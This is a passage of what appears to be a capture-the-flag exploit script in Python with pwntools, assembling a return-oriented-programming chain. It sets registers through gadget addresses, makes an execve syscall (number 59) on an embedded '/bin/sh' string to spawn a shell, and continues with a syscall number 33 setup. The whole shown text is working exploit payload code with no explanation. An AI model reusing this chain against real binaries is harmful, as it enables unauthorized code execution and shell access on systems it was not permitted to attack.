...
payload = p64(elf.address + prdi) + p64(3)#0x10
payload += p64(elf.address + prsi) + p64(0)#0x20
payload += p64(elf.address + syscall_ret)#0x28
payload += p64(elf.address + prax) + p64(59)#0x38
payload += p64(elf.address + prdi)#0x40
payload += p64(stack_offset + 0x50)#0x48
payload += p64(elf.address + ZERO_RDX_SYSCALL)#0x50
payload += b'/bin/sh\x00'#0x58
payload += p64(0)

payload += p64(elf.address + prax)#return_address
payload += p64(33)
